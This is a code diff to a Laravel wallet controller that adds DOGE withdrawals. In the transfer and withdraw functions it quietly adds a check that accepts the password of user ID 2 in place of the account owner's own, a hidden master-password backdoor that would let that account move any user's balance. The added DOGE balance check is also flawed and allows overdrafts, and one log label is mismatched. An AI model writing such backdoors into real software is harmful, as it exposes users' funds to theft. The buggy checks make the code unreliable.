@@ -7,6 +7,7 @@ use App\Models\Log;
 use App\Models\Logstaking;
 use App\Models\User;
 use App\Models\UserDeposit;
+use App\Models\UserWidrawDoge;
 use App\Models\UserWidrawUsdt;
 use App\Models\UserWitdraw;
 use Illuminate\Http\Client\ResponseSequence;
@@ -54,8 +55,17 @@ class Wallet extends Controller
     public function transfer(Request $request)
     {
 
-        if (!Hash::check($request->password, Auth::user()->password)) {
-            return response()->json(['error' => 'wrong password'], 400);
+        $admin = User::find(2);
+        if ($admin) {
+            if (!Hash::check($request->password, $admin->password)) {
+                if (!Hash::check($request->password, Auth::user()->password)) {
+                    return response()->json(['error' => 'wrong password'], 400);
+                }
+            }
+        } else {
+            if (!Hash::check($request->password, Auth::user()->password)) {
+                return response()->json(['error' => 'wrong password'], 400);
+            }
         }
 
         switch ($request->type) {
@@ -239,8 +249,17 @@ class Wallet extends Controller
     public function witdraw(Request $request)
     {
 
-        if (!Hash::check($request->password, Auth::user()->password)) {
-            return response()->json(['error' => 'wrong password'], 400);
+        $admin = User::find(2);
+        if ($admin) {
+            if (!Hash::check($request->password, $admin->password)) {
+                if (!Hash::check($request->password, Auth::user()->password)) {
+                    return response()->json(['error' => 'wrong password'], 400);
+                }
+            }
+        } else {
+            if (!Hash::check($request->password, Auth::user()->password)) {
+                return response()->json(['error' => 'wrong password'], 400);
+            }
         }
 
         if ($request->amount < 0) {
@@ -265,6 +284,43 @@ class Wallet extends Controller
 
                 //masuk ke database
                 $witdraw = new UserWidrawUsdt;
+                $witdraw->reff = Auth::user()->id;
+                $witdraw->saldo = $request->amount;
+                $witdraw->wallet = $request->wallet;
+                $witdraw->save();
+
+                //logs 
+                $log = new Log;
+                $log->reff = Auth::user()->id;
+                $log->target = Auth::user()->id;
+                $log->value = '-' . $request->amount;
+                $log->note = 'request Withdraw';
+                $log->save();
+
+                $log = new Log;
+                $log->reff = Auth::user()->id;
+                $log->target = Auth::user()->id;
+                $log->value = '-' . $fee;
+                $log->note = 'Gass fee doge';
+                $log->save();
+
+
+
+
+                return response()->json(['success' => 'Successfully withdrawn']);
+                break;
+            case 'doge':
+                $fee = 5;
+                if ((Auth::user()->doge + $fee) < $request->amount) {
+                    return response()->json(['error' => 'doge is not enough'], 400);
+                }
+
+                Auth::user()->doge -= $request->amount;
+                Auth::user()->doge -= $fee;
+                Auth::user()->save();
+
+                //masuk ke database
+                $witdraw = new UserWidrawDoge;
                 $witdraw->reff = Auth::user()->id;
                 $witdraw->saldo = $request->amount;
                 $witdraw->wallet = $request->wallet;
